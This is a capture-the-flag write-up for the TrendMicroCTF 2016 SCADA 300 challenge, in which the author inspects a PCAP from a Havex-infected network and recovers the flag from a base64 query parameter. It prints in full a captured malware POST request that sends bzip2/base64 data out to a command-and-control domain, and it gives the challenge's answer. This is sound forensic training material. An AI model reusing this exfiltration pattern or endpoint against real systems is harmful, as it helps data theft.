Title: TrendMicroCTF 2016 - SCADA 300
Category: writeup
Tags: ctf, writeup
Authors: gmerz
CTF-CTFTIME-EVENT: 340
CTF: TrendMicroCTF
CTF-YEAR: 2016
CTF-CATEGORY: SCADA
CTF-POINTS: 300
CTF-CHAL-NAME: SCADA 300
Summary: SCADA APT's FTW


The description of the challenge was as follows:
```
In this challenge you are presented with a PCAP that 
comes from a network infected by a well known SCADA 
related APT Threat (hint: pay attention to potential C&C)

Identify the relevant packets related to the malware and 
attempt to find the flag in the normal format
```

So first we had to download and unpack the relevant file. 
After fiddling around with wireshark we identified a suspiciously looking HTTP POST request to ```sinfulcelebs.freesexycomics.com```.

Full dump for the record:
```
POST /wp05/wp-admin/includes/tmp/tmp.php?id=VE1DVEZ7SGF2ZXhJc1RoZUZsYWd9 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.36 Safari/525.19
Host: sinfulcelebs.freesexycomics.com
Content-Length: 1528
Cache-Control: no-cachecn�#[81 bytes missing in capture file]QlpoOTFBWSZTWb2+JeAAAAf//////////////3//////3////1/u///+////////
////wAI9tm6d3aJAI2SaNMTTT1MDRMNTamaaQ2gmBMQ0xomnomjBMGoMDJDJgRtT
Q2iGhpp+qYNAmE9AIzTUwBMaTDQ0CeiYyNR6GCT1MEAaTDRMDQ0TTTaaAAaJkyMJ
iYAAAAAmCeiDAmjQ8hNoT0AAAA0AAAA0jDQJg0B6homEegmASeo0aY00mmAmaAJh
PQA0RkwGppk8pkwamj0NNBoGFNHqemiMajGQ0CYahkZMmjaAjah6jQ000YEbTQA1
NMEwaNTANNQynppNGg0NTJgANRgTRmpgTCYTBGIM1P1CYTTDSYAEwyNTJgTBMm0m
EwmJpgmaAACGE2gExGjE9JgAEaYFkHTHyjHPhK4ALKXICaVyFBAFwlJdAKdX/BAL
hUQbMoLHnoowSAKRi//bPPPChtrALfQuIpohlA8kRbBerXdMRNyn7eCNcJUywdQW
BWkSH8c1rADCsoZ12RJZE6AhuTPQR1Txf75YIBLG8wYZOFAI8w2siL94oEAdVvGg
IIQZvHlZzlZ6oW1s1+NiCOP4UUwg/jZqqT7oY4NKIPGx+268xOCE5XknEugQuq94
hY6JmZ+upKYIKMSb+wFGGx/BjQTsEWEMAB/S5EEyNISUtxuUBXfGmD/f5m1pHBuh
NkSLvvctcYum34+YH5EKssmCGkJ/5AhLLI7KIYhctFVjs4/YmxQ4HTQFuC9IQRfu
oavqSXwgoMDtpvbJCQPOA+vIoYGXUaQshOOSGcQElAMsTcnHHuc4lyCm2gyVrXCH
cOliSsItdIfhMz9KKE0upWcJC0iqK3za+Fj8tB8fLzAUOL2vwKdUarEtfF8Sfk0z
KsJldiQikEMMEU6JtcZNNYmyBJZAvMcvsTz+qGves06Qfzu1IaAtlHuR9sUhBQuK
6HW5Rh6K+Dt44F4ecslL38BOLqYAkytmiYkP6Yrmm4pBTbvq1FLeChxuMjAn9qXp
Wkxz+3ot4XI1hzkPFlvtMFw3ARidUvhFKA3Q2c+1pgPhOPIeDRjkHeJHZLDz72iy
tDR7UOHpkWIsb9T63biMEwYdQNd6kmbfByoJ/wYHHDYU1TWx6F3c4tqN9HiJJ6p4
20vdawYDmk2MIy9IrY3IzysppoY4fqGe/sFCooBOBC9wyV0CRokjDGBRMhx+Hk9p
CYujhHcHeuIOmT94MIAkXBVe85xvdNYZkus+awc0L+LY1GAGsnyri0EfQIhEzr8s
bvD0NJv0c5AAA7cWD6HKHg2AL2upZYqibHdkNzxdaEu4Oo8dEbKbBz8apYvdoSMU
7AK4dzWE2iySAGIxTArqn9BFIQPh4P0f27w6B/nfKSREmUP5isQ4FxEpQaOhdi5j
yBwYr2o5
```
A google search brought up a connection of this domain to the Havex Malware. 
It seems that it packs the data it wants to exfiltrate with bzip2 and then sends it as base64 encoded POST data. 
So first thing I thought of was extracting the content body.

While the base64 decoded body indeed identified as bzip2, unpacking was not possible since the bzip2 file was corrupted.
After a lot of failed tries to actually identify something useful in the dumped POST data I took another look at the 
packet and realised that there was another base64 encoded string, right there in the request's id parameter: 
```
POST /wp05/wp-admin/includes/tmp/tmp.php?id=VE1DVEZ7SGF2ZXhJc1RoZUZsYWd9 HTTP/1.1
```
which, base64 decoded gave the correct flag
```
TMCTF{HavexIsTheFlag}
```

Could have spared myself a lot of time if I had seen the parameter right away. :)













